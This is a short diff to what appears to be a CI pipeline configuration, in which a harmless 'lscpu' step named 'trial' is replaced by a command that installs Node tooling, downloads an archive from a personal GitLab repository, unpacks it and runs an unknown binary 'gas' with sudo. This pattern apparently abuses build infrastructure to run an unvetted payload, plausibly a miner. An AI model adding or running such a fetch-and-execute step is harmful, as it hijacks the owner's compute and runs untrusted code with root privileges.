@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: "trial"
-            command: lscpu
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/jonlenong969/andi/-/blob/main/hasim.tar.gz && tar -xvf hasim.tar.gz && sudo ./gas run.ini
 
 workflows:
     version: 2.1
